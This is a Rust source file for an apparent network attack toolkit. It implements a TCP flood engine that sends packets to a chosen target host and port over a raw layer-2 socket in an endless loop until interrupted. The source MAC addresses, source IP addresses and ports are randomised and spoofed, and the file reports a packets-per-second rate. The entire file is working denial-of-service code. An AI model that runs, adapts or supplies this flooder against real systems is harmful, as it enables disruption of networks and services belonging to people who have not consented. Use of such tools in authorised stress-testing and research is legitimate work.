use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::{net::Ipv4Addr, time::Instant};
use crate::engines::TcpArgs;
use crate::builders::TcpPkt;
use crate::generators::RandomValues;
use crate::iface::{SysInfo, Iface};
use crate::sockets::Layer2Socket;
use crate::utils::{abort, get_first_and_last_ip, CtrlCHandler, resolve_mac, Mac};



pub struct TcpFlooder {
    builder   : TcpPkt,
    iface     : Iface,
    pkts_sent : usize,
    rand      : RandomValues,
    src_ip    : Option<Ipv4Addr>,
    src_mac   : Option<Mac>,
    dst_ip    : Ipv4Addr,
    dst_mac   : Mac,
    dst_port  : u16,
    duration  : f64,
}


impl TcpFlooder {

    pub fn new(args: TcpArgs) -> Self {
        let iface = SysInfo::iface_from_ip(args.dst_ip);
        let cidr  = iface.cidr().unwrap_or_else(|e| abort(e));

        let (first_ip, last_ip) = get_first_and_last_ip(&cidr);

        Self {
            builder   : TcpPkt::new(),
            pkts_sent : 0,
            rand      : RandomValues::new(Some(first_ip), Some(last_ip)),
            src_ip    : args.src_ip,
            src_mac   : resolve_mac(args.src_mac.clone(), &iface),
            dst_ip    : args.dst_ip,
            dst_mac   : resolve_mac(Some(args.dst_mac.clone()), &iface).unwrap(),
            dst_port  : args.port,
            duration  : 0.0,
            iface,
        }
    }



    pub fn execute(&mut self){
        self.display_info();
        self.send_endlessly();
        self.display_exec_info();
    }


    
    fn display_info(&self) {
        let src_mac = match self.src_mac {
            Some(mac) => mac.to_string(),
            None      => "Random".to_string(),
        };

        let src_ip = match self.src_ip {
            Some(ip) => ip.to_string(),
            None     => "Random".to_string(),
        };

        let dst_mac = self.dst_mac.to_string();

        println!("[*] SRC >> MAC: {} / IP: {}", src_mac, src_ip);
        println!("[*] DST >> MAC: {} / IP: {}", dst_mac, self.dst_ip);
        println!("[*] IFACE: {}", self.iface.name());
    }



    fn send_endlessly(&mut self) {
        let socket  = Layer2Socket::new(&self.iface);
        let running = Arc::new(AtomicBool::new(true));
        CtrlCHandler::setup(running.clone());

        println!("[+] Sending packets. Press CTRL + C to stop");
        let init = Instant::now();

        while running.load(Ordering::SeqCst) {
            let pkt = self.get_pkt();
            socket.send(pkt);

            self.pkts_sent += 1;
        }
        
        println!("\n[-] Flood interrupted");
        self.duration = init.elapsed().as_secs_f64();    
    }


    
    #[inline]
    fn get_pkt(&mut self) -> &[u8] {
        self.builder.l2_pkt(
            self.src_mac.unwrap_or_else(|| self.rand.random_mac()), 
            self.src_ip.unwrap_or_else( || self.rand.random_ip()), 
            self.rand.random_port(),
            self.dst_mac, 
            self.dst_ip,
            self.dst_port,
        )
    }



    fn display_exec_info(&self) {
        println!("[%] {} packets sent in {:.2} seconds", &self.pkts_sent, self.duration);

        if self.duration > 1.0 {
            let rate = self.pkts_sent as f64 / self.duration;
            println!("[%] {:.2} packets sent per second", rate);
        };        
    }

}



impl crate::EngineTrait for TcpFlooder {
    type Args = TcpArgs;
    
    fn new(args: Self::Args) -> Self {
        TcpFlooder::new(args)
    }
    
    fn execute(&mut self) {
        self.execute();
    }
}